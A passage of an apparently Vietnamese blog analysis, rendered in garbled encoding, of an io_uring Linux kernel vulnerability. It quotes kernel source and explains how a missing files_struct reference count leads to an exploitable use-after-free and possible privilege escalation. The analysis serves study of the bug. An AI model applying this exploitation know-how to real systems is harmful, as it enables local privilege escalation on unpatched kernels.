trÃºc timespec á»Ÿ line 44dÃ¹ng Ä‘á»ƒ Ä‘áº·c táº£ thá»i gian á»Ÿ dáº¡ng seconds vÃ  nanoseconds: 1 2 3 4 5 6 #include \u0026lt;time.h\u0026gt; struct timespec { time_t tv_sec; long tv_nsec; } á» Ä‘Ã¢y, nÃ³ Ä‘Æ°á»£c táº¡o vá»›i 1 sec.\nCáº¥u trÃºc io_uring_sqe á»Ÿ line 37, 46, 52 diá»…n táº£ cáº¥u trÃºc cá»§a submission queue entry 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 struct io_uring_sqe { __u8 opcode; /* type of operation for this sqe */ __u8 flags; /* IOSQE_ flags */ __u16 ioprio; /* ioprio for the request */ __s32 fd; /* file descriptor to do IO on */ __u64 off; /* offset into file */ __u64 addr; /* pointer to buffer or iovecs */ __u32 len; /* buffer size or number of iovecs */ union { __kernel_rwf_t rw_flags; __u32 fsync_flags; __u16 poll_events; __u32 sync_range_flags; __u32 msg_flags; }; __u64 user_data; /* data to be passed back at completion time */ union { __u16 buf_index; /* index into fixed buffers, if used */ __u64 __pad2[3]; }; }; Trong Ä‘Ã³:\nopcode: Ä‘á»ƒ Ä‘áº·c táº£ hoáº¡t Ä‘á»™ng. VÃ­ dá»¥: readv dÃ¹ng háº±ng sá»‘ IORING_OP_READV fd: file descriptor cá»§a file muá»‘n Ä‘á»c addr: Ä‘Æ°á»£c dÃ¹ng Ä‘á»ƒ trá» Ä‘áº¿n má»™t máº£ng cÃ¡c iovec. len: giá»¯ giÃ¡ trá»‹ Ä‘á»™ dÃ i cá»§a máº£ng cÃ¡c iovec Do Ä‘Ã³, Ä‘oáº¡n code tá»« line 52-59 khai bÃ¡o sá»­ dá»¥ng lá»‡nh readv trÃªn file /etc/passwd. CÃ²n tá»« line 44-51 cÃ³ sá»­ dá»¥ng háº±ng sá»‘ IORING_OP_TIMEOUT Ä‘á»ƒ chá»‰ Ä‘á»‹nh ráº±ng khi á»©ng dá»¥ng Ä‘ang sleep thÃ¬ hoáº¡t Ä‘á»™ng nÃ y sáº½ Ä‘Æ°á»£c thá»±c hiá»‡n.\nCáº£ Ä‘oáº¡n code trÃªn, khi thá»±c thi, cá»© sau 0.1 seconds sáº½ kiá»ƒm tra xem liá»‡u readv() Ä‘Ã£ thá»±c thi xong hay chÆ°a. VÃ  vÃ¬ ts ta thiáº¿t láº­p nÃ³ 1 seconds vÃ  truyá»n vÃ o sqes[0] nÃªn readv() thá»±c thi (sqes[1] thá»±c thi) sáº½ sau 1 second. Tuy nhiÃªn, khi thá»±c thi, ta tháº¥y readv() láº¡i thá»±c thi ngay\n1 2 3 4 root@edisc:/home/test# ./sample READV executed root@edisc:/home/test# ./sample READV executed Äiá»u nÃ y chá»©ng tá», há»‡ thá»‘ng khÃ´ng cháº¡y báº¥t Ä‘á»“ng bá»™, hay nÃ³i cÃ¡ch khÃ¡c, nÃ³ chá»‰ cháº¡y khi nÃ³ cáº§n thiáº¿t, vÃ  trÆ°á»ng há»£p nÃ y lÃ  khÃ´ng cáº§n thiáº¿t, hoáº¡t Ä‘á»™ng cá»§a IORING_OP_TIMEOUT Ä‘Ã£ bá»‹ bá» qua.\nTa sáº½ kiá»ƒm tra trong trÆ°á»ng há»£p chÆ°Æ¡ng trÃ¬nh sample cháº¡y báº¥t Ä‘á»“ng bá»™ báº±ng tool systemtap\nTheo tÃ¡c giáº£ thÃ¬ khi thÃªm flag IORING_OP_HARDLINK thÃ¬ chÆ°Æ¡ng trÃ¬nh sample.c sáº½ tiáº¿n hÃ nh kiáº¿m tra sau 0.1s in ra dÃ²ng chá»¯ waiting vÃ  sau 1s lá»‡nh READV sáº½ Ä‘Æ°á»£c thá»±c thi, vÃ  sáº½ in ra READV executed. Tuy nhiÃªn trong quÃ¡ trÃ¬nh kiá»ƒm tra trÃªn ubuntu 20.04, kernel 5.8.0-59-generic thÃ¬ láº¡i nháº­n Ä‘Æ°á»£c thÃ´ng bÃ¡o IORING_OP_HARDLINK chÆ°a Ä‘Æ°á»£c khai bÃ¡o. Trong khi IORING_OP_LINK váº«n bÃ¬nh thÆ°á»ng.\nMá»™t chÃºt vá» IOSQE_IO_HARDLINK vÃ  IOSQE_IO_LINK á» trÃªn ta cÃ³ Ä‘á» cáº­p tá»›i 2 flag IOSQE_IO_HARDLINK vÃ  IOSQE_IO_LINK, ta sáº½ tÃ¬m hiá»ƒu nÃ³ lÃ  gÃ¬.\nIOSQE_IO_LINK: cá» nÃ y Ä‘á»ƒ chá»‰ Ä‘á»‹nh cÃ¡c SQE Ä‘Æ°á»£c cháº¡y trong hÃ ng Ä‘á»£i sáº½ phá»¥ thuá»™c láº«n nhau, pháº§n tá»­ sau Ä‘á»£i pháº§n tá»­ á»Ÿ trÆ°á»›c, giá»‘ng nhÆ° trong 1 gia Ä‘Ã¬nh, Ã´ng bá»‘ pháº£i sinh ra rá»“i tháº±ng con má»›i Ä‘Æ°á»£c sinh, náº¿u Ã´ng bá»‘ sinh tháº¥t báº¡i thÃ¬ tháº±ng con, chÃ¡u vÃ  cáº£ dÃ²ng há» sau nÃ y cÅ©ng sáº½ ra Ä‘i theo Ã´ng bá»‘. Äá»™ dÃ i cá»§a chuá»—i sáº½ tÃ¹y Ã½, tá»± má»Ÿ rá»™ng náº¿u cÃ³ thÃªm SQE vÃ o. IOSQE_IO_HARDLINK: giá»‘ng nhÆ° link nhÆ°ng nÃ³ máº¡nh hÆ¡n. Má»™t sá»‘ lá»‡nh bá»‹ káº¿t thÃºc do gáº·p pháº£i lá»—i, lÃºc nÃ y káº¿t quáº£ tráº£ vá» sáº½ \u0026lt; 0. VÃ­ dá»¥, timeout sáº½ khÃ´ng cÃ³ bá»™ Ä‘áº¿m sá»‘ láº§n thá»±c hiá»‡n, nÃ³ sáº½ luÃ´n hoÃ n thÃ nh vá»›i -ETIME trá»« khi nÃ³ bá»‹ há»§y. Do Ä‘Ã³, náº¿u dÃ¹ng cá» IOSQE_IO_LINK khi 1 SQE tráº£ vá» giÃ¡ trá»‹ nhá» hÆ¡n 0, nÃ³ sáº½ cáº¯t Ä‘á»©t toÃ n bá»™ chuá»—i phÃ­a sau. TrÆ°á»ng há»£p chÃºng ta cÃ³ dÃ¹ng lá»‡nh vÃ  biáº¿t cháº¯c nÃ³ sáº½ xáº£y ra lá»—i, khi Ä‘Ã³, IOSQE_IO_HARDLINK sáº½ lÃ m liÃªn káº¿t máº¡nh hÆ¡n mÃ  khÃ´ng bá»‹ cáº¯t Ä‘á»©t bá»Ÿi káº¿t quáº£ tráº£ vá» á»Ÿ SQE trÆ°á»›c Ä‘Ã³. ChÃº Ã½ ráº±ng liÃªn káº¿t váº«n sáº½ bá»‹ ngáº¯t náº¿u lá»‡nh trÆ°á»›c Ä‘Ã³ khÃ´ng gá»­i vÃ  thá»±c hiá»‡n Ä‘Æ°á»£c, cÃ¡c liÃªn káº¿t chá»‰ Ä‘Æ°á»£c phá»¥c há»“i khi yÃªu cáº§u trÆ°á»›c Ä‘Ã³ nháº­n Ä‘Æ°á»£c pháº£n há»“i. Ta cÃ³ thá»ƒ tháº¥y, nguyÃªn lÃ­ hoáº¡t Ä‘á»™ng cá»§a viá»‡c quyáº¿t Ä‘á»‹nh má»™t tÃ¡c vá»¥ cÃ³ cháº¡y Ä‘Æ°á»£c báº¥t Ä‘á»“ng bá»™ hay khÃ´ng nhÆ° sau:\nTrong áº£nh trÃªn, ta tháº¥y mÃ  process bá»‹ cháº·n láº¡i thÃ¬ nÃ³ sáº½ chuyá»ƒn Ä‘áº¿n IORING_OP_TIMEOUT vÃ  tá»« Ä‘Ã¢y nÃ³ sáº½ Ä‘Æ°á»£c chuyá»ƒn sang kernel thread. NhÆ° Ä‘Ã£ Ä‘á» cáº­p trÆ°á»›c Ä‘Ã³, API nÃ y nÃ³ chá»‰ cháº¡y báº¥t Ä‘á»“ng bá»™ khi cáº§n nghÄ©a lÃ  sáº½ cÃ³ má»™t sá»‘ Ä‘iá»u kiá»‡n nÃ o Ä‘Ã³ Ä‘á»ƒ nÃ³ cháº¡y báº¥t Ä‘á»“ng bá»™. VÃ­ dá»¥ má»™t sá»‘ trÆ°á»ng há»£p sau.\nKhi báº­t cá» yÃªu cáº§u buá»™c pháº£i cháº¡y báº¥t Ä‘á»“ng bá»™ REQ_F_FORCE_ASYNC 1 2 3 4 5 6 7 8 9 } else if (req-\u0026gt;flags \u0026amp; REQ_F_FORCE_ASYNC) { ...... /* * Never try inline submit of IOSQE_ASYNC is set, go straight * to async execution. */ req-\u0026gt;work.flags |= IO_WQ_WORK_CONCURRENT; io_queue_async_work(req); } code here\nDo logic cá»§a tá»«ng hoáº¡t Ä‘á»™ng riÃªng, vÃ­ dá»¥ nhÆ° thÃªm flag IOCB_NOWAIT khi gá»i readv() vÃ  tráº£ vá» EAGAIN khi muá»‘n dá»«ng. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 static int io_read(struct io_kiocb *req, struct io_kiocb **nxt, bool force_nonblock) { ...... ret = rw_verify_area(READ, req-\u0026gt;file, \u0026amp;kiocb-\u0026gt;ki_pos, iov_count); if (!ret) { ssize_t ret2; if (req-\u0026gt;file-\u0026gt;f_op-\u0026gt;read_iter) ret2 = call_read_iter(req-\u0026gt;file, kiocb, \u0026amp;iter); else ret2 = loop_rw_iter(READ, req-\u0026gt;file, kiocb, \u0026amp;iter); /* Catch -EAGAIN return for forced non-blocking submission */ if (!force_nonblock || ret2 != -EAGAIN) { kiocb_done(kiocb, ret2, nxt, req-\u0026gt;in_async); } else { copy_iov: ret = io_setup_async_rw(req, io_size, iovec, inline_vecs, \u0026amp;iter); if (ret) goto out_free; return -EAGAIN; } } ...... } code here\ná» Ä‘Ã¢y cÃ³ cáº¥u trÃºc io_kiocb phá»¥c vá»¥ cho viá»‡c Ä‘á»c file\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 /* * NOTE! Each of the iocb union members has the file pointer * as the first entry in their struct definition. So you can * access the file pointer through any of the sub-structs, * or directly as just \u0026#39;ki_filp\u0026#39; in this struct. */ struct io_kiocb { union { struct file\t*file; struct io_rw\trw; struct io_poll_iocb\tpoll; struct io_poll_update\tpoll_update; struct io_accept\taccept; struct io_sync\tsync; struct io_cancel\tcancel; struct io_timeout\ttimeout; struct io_timeout_rem\ttimeout_rem; struct io_connect\tconnect; struct io_sr_msg\tsr_msg; struct io_open\topen; struct io_close\tclose; struct io_rsrc_update\trsrc_update; struct io_fadvise\tfadvise; struct io_madvise\tmadvise; struct io_epoll\tepoll; struct io_splice\tsplice; struct io_provide_buf\tpbuf; struct io_statx\tstatx; struct io_shutdown\tshutdown; struct io_rename\trename; struct io_unlink\tunlink; /* use only after cleaning per-op data, see io_clean_op() */ struct io_completion\tcompl; }; Khi giÃ¡ trá»‹ EAGAIN Ä‘Æ°á»£c tráº£ vá», process sáº½ Ä‘Æ°á»£c Ä‘Æ°a vÃ o hÃ ng Ä‘á»£i Ä‘á»ƒ cháº¡y báº¥t Ä‘á»“ng bá»™ line 9-23:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 static void __io_queue_sqe(struct io_kiocb *req, const struct io_uring_sqe *sqe) { ...... ret = io_issue_sqe(req, sqe, \u0026amp;nxt, true); /* * We async punt it if the file wasn\u0026#39;t marked NOWAIT, or if the file * doesn\u0026#39;t support non-blocking read/write attempts */ if (ret == -EAGAIN \u0026amp;\u0026amp; (!(req-\u0026gt;flags \u0026amp; REQ_F_NOWAIT) || (req-\u0026gt;flags \u0026amp; REQ_F_MUST_PUNT))) { punt: if (io_op_defs[req-\u0026gt;opcode].file_table) { ret = io_grab_files(req); if (ret) goto err; } /* * Queued up for async execution, worker will release * submit reference when the iocb is actually submitted. */ io_queue_async_work(req); goto done_req; } ...... } Khi cá» IOSQE_IO_LINK | IOSQE_IO_HARDLINK Ä‘Æ°á»£c sá»­ dá»¥ng, thá»© tá»± thá»±c thi sáº½ Ä‘Æ°á»£c chá»‰ Ä‘á»‹nh, hoáº¡t Ä‘á»™ng Ä‘ang thá»±c hiá»‡n trÆ°á»›c Ä‘Ã³ sáº½ Ä‘Æ°á»£c yÃªu cáº§u chuyá»ƒn sang báº¥t Ä‘á»“ng bá»™. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 static bool io_submit_sqe(struct io_kiocb *req, const struct io_uring_sqe *sqe, struct io_submit_state *state, struct io_kiocb **link) { ...... /* * If we already have a head request, queue this one for async * submittal once the head completes. If we don\u0026#39;t have a head but * IOSQE_IO_LINK is set in the sqe, start a new head. This one will be * submitted sync once the chain is complete. If none of those * conditions are true (normal request), then just queue it. */ if (*link) { ...... list_add_tail(\u0026amp;req-\u0026gt;link_list, \u0026amp;head-\u0026gt;link_list); /* last request of a link, enqueue the link */ if (!(sqe_flags \u0026amp; (IOSQE_IO_LINK|IOSQE_IO_HARDLINK))) { io_queue_link_head(head); *link = NULL; } } else { ...... if (sqe_flags \u0026amp; (IOSQE_IO_LINK|IOSQE_IO_HARDLINK)) { req-\u0026gt;flags |= REQ_F_LINK; INIT_LIST_HEAD(\u0026amp;req-\u0026gt;link_list); if (io_alloc_async_ctx(req)) { ret = -EAGAIN; goto err_req; } ret = io_req_defer_prep(req, sqe); if (ret) req-\u0026gt;flags |= REQ_F_FAIL_LINK; *link = req; } else { io_queue_sqe(req, sqe); } } return true; } line 12-19 lÃ  trÆ°á»ng há»£p Ä‘Ã£ tá»“n táº¡i head request, trong Ä‘Ã³: line 12-14 Ä‘Æ°a sqe vÃ o Ä‘uÃ´i cá»§a list. line 16-19 lÃ  trÆ°á»ng há»£p khÃ´ng cá» IOSQE_IO_LINK|IOSQE_IO_HARDLINK khÃ´ng Ä‘Æ°á»£c báº­t\nNáº¿u khÃ´ng tá»“n táº¡i head request mÃ  cá» IOSQE_IO_LINK|IOSQE_IO_HARDLINK báº­t, thÃ¬ há»‡ thá»‘ng sáº½ táº¡o má»™t head má»›i (line 24), vÃ  chuyá»ƒn sang báº¥t Ä‘á»“ng bá»™(line 25)\nNÃ³i má»™t cÃ¡ch chÃ­nh xÃ¡c, vá»›i IORING_OP_TIMEOUT cÃ³ má»™t chÃºt Ä‘áº·c biá»‡t, Ä‘Ã³ lÃ  nÃ³ khÃ´ng tráº£ vá» EAGAIN nhÆ° nhá»¯ng minh há»a trÃªn, tuy nhiÃªn tÃ¡c giáº£ nghÄ© Ä‘Ã¢y lÃ  má»™t vÃ­ dá»¥ dá»… Ä‘á»ƒ hiá»ƒu nÃªn Ã´ng ta Ä‘Ã£ quyáº¿t Ä‘á»‹nh dÃ¹ng nÃ³ Ä‘á»ƒ giáº£i thÃ­ch, minh há»a trong blog cá»§a mÃ¬nh.\nKhi thay thÃªm .flags = IOSQE_IO_HARDLINK thÃ¬ IORING_OP_TIMEOUT sáº½ Ä‘Æ°á»£c thá»±c thi bá»Ÿi 1 thread khÃ¡c, cÃ²n IORING_OP_READV sáº½ Ä‘Æ°á»£c thá»±c thi sau 1s. Tuy nhiÃªn, táº¡i thá»i Ä‘iá»ƒm tÃ´i thá»±c hiá»‡n trÃªn linux kernel 5.8.0-59-generic, thÃ¬ láº¡i khÃ´ng tá»“n táº¡i flag IOSQE_IO_HARDLINK, TÃ´i váº«n khÃ´ng biáº¿t lÃ­ do trÃªn lÃ  do io_uring Ä‘Ã£ bá» nÃ³ Ä‘i Ä‘á»ƒ fix lá»—i, hay do trong quÃ¡ trÃ¬nh cÃ i Ä‘áº·t tÃ´i Ä‘Ã£ bá»‹ thiáº¿u gÃ¬ Ä‘Ã³. VÃ  má»™t Ä‘iá»u ná»¯a, tÃ¡c giáº£ sá»­ dá»¥ng systemstap Ä‘á»ƒ debug ráº¥t mÆ°á»£t, cÃ²n tÃ´i, trong quÃ¡ trÃ¬nh follow theo thÃ¬ láº¡i tá»‘n khÃ¡ nhiá»u thá»i gian cho script nÃ y vÃ  Ä‘áº¿n bÃ¢y giá» váº«n tháº¥t báº¡i.\nRÃµ rÃ ng trÃªn há»‡ thá»‘ng chá»‰ cÃ³ IOSQE_IO_LINK, nhÆ°ng khi báº­t flag nÃ y, nhÆ° Ä‘Ã£ nÃ³i á»Ÿ trÆ°á»›c Ä‘Ã³, káº¿t quáº£ Ä‘áº¡t Ä‘Æ°á»£c lÃ  khÃ´ng nhÆ° mong muá»‘n vÃ¬ sqe[0] chÆ°a hoÃ n thÃ nh nÃªn sqe[1] (IORING_OP_READV) sáº½ khÃ´ng thá»±c thi.\nMáº·c dÃ¹ nÃ³ khÃ´ng Ä‘Æ°a ra káº¿t quáº£ nhÆ° mong muá»‘n (cáº§n dÃ¹ng IOSQE_IO_HARDLINK) nhÆ°ng khi dÃ¹ng IOSQE_IO_LINK tá»« phÃ­a kernel nhÃ¬n xuá»‘ng ta váº«n tháº¥y IORING_OP_READV vÃ  IORING_OP_TIMEOUT váº«n Ä‘Æ°á»£c xá»­ lÃ­ nhÆ° 2 tháº±ng, vÃ  IORING_OP_TIMEOUT Ä‘Æ°á»£c xem nhÆ° worker.\nKáº¿t quáº£ trÃªn minh há»a cho Ä‘oáº¡n code Ä‘á»ƒ táº¡o worker tá»« kernel nhÆ° sau: 1 2 3 4 5 6 7 static bool create_io_worker(struct io_wq *wq, struct io_wqe *wqe, int index) { ...... worker-\u0026gt;task = kthread_create_on_node(io_wqe_worker, worker, wqe-\u0026gt;node, \u0026#34;io_wqe_worker-%d/%d\u0026#34;, index, wqe-\u0026gt;node); ...... } Khi io_timeout() Ä‘Æ°á»£c gá»i, nÃ³ sáº½ Ä‘áº·t io_timeout_fn() trong handler vÃ  báº¯t Ä‘áº§u bá»™ Ä‘áº¿m thá»i gian. Sau khi háº¿t thá»i gian cho phÃ©p (timeout) io_timeout_fn() sáº½ Ä‘Æ°á»£c gá»i Ä‘á»ƒ load cÃ¡c hoáº¡t Ä‘á»™ng Ä‘Æ°á»£c káº¿t ná»‘i trong hÃ ng Ä‘á»£i Ä‘á»ƒ thá»±c thi báº¥t Ä‘á»“ng bá»™. Tá»©c lÃ  IORING_OP_TIMEOUT khÃ´ng cÃ³ Ä‘Æ°á»£c Ä‘áº·t vÃ o hÃ ng Ä‘á»£i thá»±c thi báº¥t Ä‘á»“ng bá»™. TÃ¡c giáº£ dÃ¹ng TIMEOUT Ä‘á»ƒ giáº£i thÃ­ch Ä‘Æ¡n giáº£n vÃ¬ khi nháº¯c tá»›i TIMEOUT chÃºng ta sáº½ liÃªn tÆ°á»Ÿng ngay tá»›i viá»‡c luá»“ng thá»±c thi hiá»‡n táº¡i sáº½ Ä‘Æ°á»£c dá»«ng láº¡i.\nPrecautions when offloading I/O operations to the Kernel ChÃºng ta Ä‘Ã£ tháº¥y hoáº¡t Ä‘á»™ng báº¥t Ä‘á»“ng bá»™ trÃªn io_uring sáº½ Ä‘Æ°á»£c thá»±c hiá»‡n bá»Ÿi worker vÃ  cháº¡y dÆ°á»›i dáº¡ng Kernel Thread. Tuy nhiÃªn cáº§n cÃ³ má»™t sá»‘ lÆ°u Ã½: VÃ¬ nÃ³ cháº¡y á»Ÿ dáº¡ng Kernel Thread, nÃªn ngá»¯ cáº£nh thá»±c thi (execution context) sáº½ khÃ¡c vá»›i khi Ä‘Æ°á»£c gá»i bá»Ÿi io_uring. á» Ä‘Ã¢y, execution context Ã¡m chá»‰ cáº¥u trÃºc task_struct cá»§a process vÃ  cÃ¡c thÃ´ng tin tÆ°Æ¡ng á»©ng cá»§a nÃ³. VÃ­ dá»¥ nhÆ° mm (Manage the virtual memory space of the process), cred (holds UID/GID/Capability), file struct (holds a table for file descriptors)\nNáº¿u 1 process khi thá»±c thi á»Ÿ Kernel Thread mÃ  khÃ´ng tham chiáº¿u Ä‘Ãºng Ä‘á»ƒ cáº¥u trÃºc trÃªn khi thá»±c hiá»‡n systemcall nÃ³ cÃ³ thá»ƒ trá» tá»›i bá»™ nhá»› áº£o sai, trá» tá»›i file description table, hoáº·c Ä‘Æ°a ra cÃ¡c hoáº¡t Ä‘á»™ng Ä‘áº·c quyá»n vá»›i Kernel Thread (quyá»n háº¡n nhÆ° root). Trong CVE nÃ y, lá»—i xáº£y ra á»Ÿ Ä‘Ã¢y, ngÆ°á»i viáº¿t táº¡i thá»i Ä‘iá»ƒm trÃªn quÃªn chuyá»ƒn cred vÃ  lÃ m cho nhá»¯ng hoáº¡t Ä‘á»™ng lÃºc nÃ y cÃ³ thá»ƒ Ä‘Æ°á»£c thá»±c thi cÃ¹ng quyá»n háº¡n nhÆ° root. Máº·c dÃ¹ nhá»¯ng hoáº¡t Ä‘á»™ng tÆ°Æ¡ng Ä‘Æ°Æ¡ng vá»›i open() táº¡i thá»i Ä‘iá»ƒm chÆ°a Ä‘Æ°á»£c hiá»‡n thá»±c, nÃªn chÃºng ta khÃ´ng thá»ƒ Ä‘á»c file, nhÆ°ng chÃºng ta cÃ³ thá»ƒ báº¯n nhá»¯ng thÃ´ng bÃ¡o (message) Ä‘áº·c quyá»n trong sendmsg's vá»›i tÃ¹y chá»n SCM_CREDENTIALS Ä‘á»ƒ thÃ´ng bÃ¡o cho cÆ¡ quan cÃ³ tháº©m quyá»n cá»§a ngÆ°á»i gá»­i (senderâ€™s authority). Váº¥n Ä‘á» nÃ y liÃªn quan tá»›i D-Bus. Do Ä‘Ã³, trong io_uring nhá»¯ng tham kháº£o Ä‘Ã³ Ä‘Æ°á»£c Ä‘Æ°a vÃ o worker Ä‘á»ƒ worker chia sáº» execution context báº±ng cÃ¡ch chuyá»ƒn qua context cá»§a nÃ³ trÆ°á»›c khi thá»±c thi. VÃ­ dá»¥: trong Ä‘oáº¡n code sau Ä‘Ã¢y, táº¡i line 6 vÃ  line 9 chÃºng ta cÃ³ thá»ƒ tháº¥y tham kháº£o tá»›i mm vÃ  cred Ä‘Æ°á»£c Ä‘Æ°a vÃ o req-\u0026gt;work: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 static inline void io_req_work_grab_env(struct io_kiocb *req, const struct io_op_def *def) { if (!req-\u0026gt;work.mm \u0026amp;\u0026amp; def-\u0026gt;needs_mm) { mmgrab(current-\u0026gt;mm); req-\u0026gt;work.mm = current-\u0026gt;mm; } if (!req-\u0026gt;work.creds) req-\u0026gt;work.creds = get_current_cred(); if (!req-\u0026gt;work.fs \u0026amp;\u0026amp; def-\u0026gt;needs_fs) { spin_lock(\u0026amp;current-\u0026gt;fs-\u0026gt;lock); if (!current-\u0026gt;fs-\u0026gt;in_exec) { req-\u0026gt;work.fs = current-\u0026gt;fs; req-\u0026gt;work.fs-\u0026gt;users++; } else { req-\u0026gt;work.flags |= IO_WQ_WORK_CANCEL; } spin_unlock(\u0026amp;current-\u0026gt;fs-\u0026gt;lock); } if (!req-\u0026gt;work.task_pid) req-\u0026gt;work.task_pid = task_pid_vnr(current); } file struct cÅ©ng Ä‘Æ°á»£c Ä‘Æ°a vÃ o req-\u0026gt;work á»Ÿ Ä‘oáº¡n code sau:\n1 2 3 4 5 6 7 8 9 10 11 static int io_grab_files(struct io_kiocb *req) { ...... if (fcheck(ctx-\u0026gt;ring_fd) == ctx-\u0026gt;ring_file) { list_add(\u0026amp;req-\u0026gt;inflight_entry, \u0026amp;ctx-\u0026gt;inflight_list); req-\u0026gt;flags |= REQ_F_INFLIGHT; req-\u0026gt;work.files = current-\u0026gt;files; ret = 0; } ...... } VÃ  trÆ°á»›c khi nÃ³ chuyá»ƒn sang thá»±c thi dÆ°á»›i dáº¡ng kernel thread, worker sáº½ thay tháº¿ nhá»¯ng tham kháº£o Ä‘Æ°á»£c truyá»n vÃ o vá»›i ná»™i dung hiá»‡n táº¡i cá»§a nÃ³.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 static void io_worker_handle_work(struct io_worker *worker) __releases(wqe-\u0026gt;lock) { struct io_wq_work *work, *old_work = NULL, *put_work = NULL; struct io_wqe *wqe = worker-\u0026gt;wqe; struct io_wq *wq = wqe-\u0026gt;wq; do { ...... if (work-\u0026gt;files \u0026amp;\u0026amp; current-\u0026gt;files != work-\u0026gt;files) { task_lock(current); current-\u0026gt;files = work-\u0026gt;files; task_unlock(current); } if (work-\u0026gt;fs \u0026amp;\u0026amp; current-\u0026gt;fs != work-\u0026gt;fs) current-\u0026gt;fs = work-\u0026gt;fs; if (work-\u0026gt;mm != worker-\u0026gt;mm) io_wq_switch_mm(worker, work); if (worker-\u0026gt;cur_creds != work-\u0026gt;creds) io_wq_switch_creds(worker, work); ...... work-\u0026gt;func(\u0026amp;work); ...... } while (1); } Vulnerability explanation Reference counter in files_struct structure when sharing with the worker Trong Ä‘oáº¡n code sau Ä‘Ã¢y, worker Ä‘ang chuyá»ƒn má»™t tham chiáº¿u Ä‘áº¿n cáº¥u trÃºc files_struct cá»§a luá»“ng Ä‘ang thá»±c hiá»‡n lá»‡nh gá»i há»‡ thá»‘ng tá»›i cáº¥u trÃºc mÃ  worker sáº½ tham chiáº¿u sau nÃ y mÃ  khÃ´ng cáº§n tÄƒng bá»™ Ä‘áº¿m tham chiáº¿u.\n1 2 3 4 5 6 7 8 9 10 11 static int io_grab_files(struct io_kiocb *req) { ...... if (fcheck(ctx-\u0026gt;ring_fd) == ctx-\u0026gt;ring_file) { list_add(\u0026amp;req-\u0026gt;inflight_entry, \u0026amp;ctx-\u0026gt;inflight_list); req-\u0026gt;flags |= REQ_F_INFLIGHT; req-\u0026gt;work.files = current-\u0026gt;files; ret = 0; } ...... } Báº±ng cÃ¡ch nÃ y, khi vÃ o hÃ ng Ä‘á»£i thá»±c thi báº¥t Ä‘á»“ng bá»™, tham chiáº¿u tá»›i cáº¥u trÃºc file Ä‘Æ°á»£c giá»¯ láº¡i Ä‘áº§u tiÃªn tá»« bá»™ mÃ´ táº£ tá»‡p Ä‘Æ°á»£c chá»‰ Ä‘á»‹nh\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 static int io_req_set_file(struct io_submit_state *state, struct io_kiocb *req, const struct io_uring_sqe *sqe) { struct io_ring_ctx *ctx = req-\u0026gt;ctx; unsigned flags; int fd; flags = READ_ONCE(sqe-\u0026gt;flags); fd = READ_ONCE(sqe-\u0026gt;fd); if (!io_req_needs_file(req, fd)) return 0; if (flags \u0026amp; IOSQE_FIXED_FILE) { if (unlikely(!ctx-\u0026gt;file_data || (unsigned) fd \u0026gt;= ctx-\u0026gt;nr_user_files)) return -EBADF; fd = array_index_nospec(fd, ctx-\u0026gt;nr_user_files); req-\u0026gt;file = io_file_from_index(ctx, fd); if (!req-\u0026gt;file) return -EBADF; req-\u0026gt;flags |= REQ_F_FIXED_FILE; percpu_ref_get(\u0026amp;ctx-\u0026gt;file_data-\u0026gt;refs); } else { if (req-\u0026gt;needs_fixed_file) return -EBADF; trace_io_uring_file_get(ctx, fd); req-\u0026gt;file = io_file_get(state, fd); if (unlikely(!req-\u0026gt;file)) return -EBADF; } return 0; } Do Ä‘Ã³, worker khÃ´ng cáº§n pháº£i trÃ­ch xuáº¥t nÃ³ tá»« fd hoáº·c trá» tá»›i cáº¥u trÃºc files_struct má»™t láº§n ná»¯a. Náº¿u nhÆ° tháº¿ thÃ¬ viá»‡c khÃ´ng tÄƒng bá»™ Ä‘áº¿m tham chiáº¿u tá»›i files_struct khÃ´ng bá»‹ áº£nh hÆ°á»Ÿng gÃ¬. NhÆ°ng giáº£ Ä‘á»‹nh trÃªn khÃ´ng Ä‘Ãºng vá»›i Linux Kernel 5.5 trá»Ÿ lÃªn bá»Ÿi vÃ¬ nhá»¯ng system call sáº½ áº£nh hÆ°á»Ÿng tá»›i file descriptor table nhÆ° open/close/accept Ä‘Ã£ cÃ³ sáºµn trÃªn io_uring, do Ä‘Ã³, chÃºng ta cÃ³ thá»ƒ sá»­ dá»¥ng Ä‘á»ƒ khai thÃ¡c. Tuy nhiÃªn,\nChá»‰ gá»i nhá»¯ng syscall 1 cÃ¡ch thÃ´ng thÆ°á»ng sáº½ cháº³ng cÃ³ gÃ¬ xáº£y ra khi cáº¥u trÃºc file_struct Ä‘Ã£ sáºµn sÃ ng, vÃ  ko thá»ƒ táº¡o ra race condition vÃ¬ syscall cÃ³ countermeasures khi xá»­ lÃ­ má»™t file báº±ng nhiá»u thread. Giáº£i phÃ³ng files_struct báº±ng cÃ¡ch thiáº¿t láº­p reference counter báº±ng 0 =\u0026gt; 1 process nÃ o Ä‘Ã³ cÃ³ thá»ƒ dÃ¹ng nÃ³ nhÆ° lÃ  file_struct cá»§a nÃ³ Ä‘á»ƒ thá»±c hiá»‡n. Má»™t vÃ­ dá»¥ nhÆ° nhÃ  cá»§a báº¡n mÃ  báº¡n Ä‘á»ƒ báº£ng \u0026ldquo;nhÃ  hoang\u0026rdquo; thÃ¬ má»™t ngÆ°á»i nÃ o Ä‘Ã³ cÃ³ thá»ƒ Ä‘i vÃ o Ä‘Ã³ á»Ÿ, sinh sá»‘ng. ChÃºng ta cÃ³ thá»ƒ chÃ¨n 1 cáº¥u trÃºc file vÃ o file description table cá»§a process má»›i báº±ng má»Ÿ 1 file, nhÆ°ng nÃ³ sáº½ khÃ´ng Ä‘Æ°á»£c reference vÃ¬ ngÆ°á»i dÃ¹ng khÃ´ng sá»­ dá»¥ng cá»‘ Ä‘á»‹nh sá»‘ lÆ°á»£ng file descriptor trong khi láº­p trÃ¬nh. Mechanism of reference counter in open/close system call 